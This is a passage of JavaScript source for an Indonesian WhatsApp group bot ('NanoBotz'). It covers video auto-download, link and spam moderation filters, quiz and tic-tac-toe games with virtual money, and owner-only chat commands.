
_Download By ${global.botname}_`;
const vidnya = data.data.video;
NanoBotz.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
}
  }
//=========================================\\
//Auto Download Video Instagram

//=========================================\\
//Auto Download Video Facebook
if(budy.includes('https://www.facebook.com/')){
const fg = require('api-dylux')
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replynano('Url invalid')
  }
  try {
    const result = await fg.fbdl(budy);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    NanoBotz.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replynano('Maybe private video!')
  }

}
//=========================================\\
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
NanoBotz.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
NanoBotz.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response, // Gantilah dengan teks yang sesuai
}, {
  quoted: m
})
}
}
//=========================================\\
// Anti Link
if (antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){		  
        } else {
          replynano(`*Bot Lain Terdeteksi*\n\nHusshhh Keluar dari grup ini!!!`)
    return await NanoBotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
   
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://chat.whatsapp.com/`+await NanoBotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return NanoBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return NanoBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (DanzTheCreator) return NanoBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			NanoBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }

 // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
kice = m.sender
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
kice = m.sender
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
          await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			NanoBotz.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (BadNano.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await 
NanoBotz.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin kirim link telegram, admin mah bebas kirim link apapun😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan telegram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin kirim link tiktok, admin mah bebas kirim link apapun😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan tiktok di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin sudah kirim link twitter, admin mah bebas kirim link apapun😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan twitter di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

NanoBotz.family100 = NanoBotz.family100 ? NanoBotz.family100 : {};
if (from in NanoBotz.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = NanoBotz.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);
    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);
        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return replynano('Dikit lagi!');
            }
        }
        if (!isCmd && room.terjawab[index]) {
            return;
        }
        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }
    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;
    let caption = `*GAME FAMILY100*
*Soal:* ${room.soal}
Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}
${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim();
    NanoBotz.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        NanoBotz.family100[id].msg = msg;
    }).catch(_ => _);
    if (isWin || isSurrender) {
        delete NanoBotz.family100[id];
    }
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   NanoBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

NanoBotz.tebakkata = NanoBotz.tebakkata ? NanoBotz.tebakkata : {}  
if (from in NanoBotz.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(NanoBotz.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
 replynano(`${teks}`)
 clearTimeout(NanoBotz.tebakkata[id][2])
 delete NanoBotz.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
NanoBotz.tebakgambar = NanoBotz.tebakgambar ? NanoBotz.tebakgambar : {} 
if(from in NanoBotz.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(NanoBotz.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
 replynano(`${teks}`)
 clearTimeout(NanoBotz.tebakgambar[id][3])
 delete NanoBotz.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}

if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }

if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }

 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
        
//=========================================\\
NanoBotz.tekateki = NanoBotz.tekateki ? NanoBotz.tekateki : {}  
if(from in NanoBotz.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(NanoBotz.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += NanoBotz.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${NanoBotz.tekateki[id][2]} Money 💸`
 replynano(`${teks}`)
 clearTimeout(NanoBotz.tekateki[id][3])
 delete NanoBotz.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*Dikit Lagi!*`)
}
//=========================================\\

if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
//=========================================\\
        NanoBotz.siapaaku = NanoBotz.siapaaku ? NanoBotz.siapaaku : {}
if(from in NanoBotz.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(NanoBotz.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += NanoBotz.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${NanoBotz.siapaaku[id][2]} Money 💸`
   replynano(`${teks}`)
 clearTimeout(NanoBotz.siapaaku[id][3])
 delete NanoBotz.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*Dikit Lagi!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        NanoBotz.susunkata = NanoBotz.susunkata ? NanoBotz.susunkata : {}  
if(from in NanoBotz.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(NanoBotz.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += NanoBotz.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${NanoBotz.susunkata[id][2]} Money 💸`
replynano(`${teks}`)
 clearTimeout(NanoBotz.susunkata[id][3])
 delete NanoBotz.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

//=========================================//
NanoBotz.tebaklirik = NanoBotz.tebaklirik ? NanoBotz.tebaklirik : {}  
if(from in NanoBotz.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(NanoBotz.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += NanoBotz.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${NanoBotz.tebaklirik[id][2]} Money 💸\n EXP: +10`
  replynano(`${teks}`)
 clearTimeout(NanoBotz.tebaklirik[id][3])
 delete NanoBotz.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

//antilink all by Dansya
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\n Admin kirim link,\n Admin mah bebas cuy 🗿☕`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
NanoBotz.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: NanoBotz.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, NanoBotz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
NanoBotz.ev.emit('messages.upsert', msg)
} 
switch (command) {
case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replynano(`You Are Still In The Game`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room13.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room13.x !== room13.o) await NanoBotz.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await NanoBotz.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replynano('Waiting For Partner' + (text ? ` Type The Command Below ${prefix}${command} ${text}` : ''))
            this.game[room13.id] = room13
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            NanoBotz.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            replynano(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            replynano('damaged')
            }
            }
            break
            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replynano(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return replynano(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return replynano(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replynano(`Orang yang Anda tantang sedang bermain sesuai dengan orang lain :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Silahkan ketik accept untuk menerima atau ketik reject untuk menolak`
            this.suit[id] = {
            chat: await NanoBotz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) NanoBotz.sendText(m.chat, `_suit waktu habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break 
  case 'public': {
if (!DanzTheCreator) return reply(mess.only.owner)
NanoBotz.public = true
replynano('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
            break
            case 'self': {
if (!DanzTheCreator) return reply(mess.only.owner)
NanoBotz.public = false
replynano('*Sukses Berubah Menjadi Pemakaian Sendiri*')
            }
            break

case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replynano(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await NanoBotz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await NanoBotz.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command} text1|text2`)
}
}
break
case 'clearall': {
if (!DanzTheCreator) return reply(mess.only.owner)
NanoBotz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
NanoBotz.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
NanoBotz.chatModify({ pin: false }, m.chat)
}
break
case 'restart':
if (!DanzTheCreator) return reply(mess.only.owner)
replynano(`"restarting..._ ${global.botname}`)
replynano(`Done ✅`)
await sleep(3000)
process.exit()
break
case 'totalfeature':
        case 'totalfitur': 
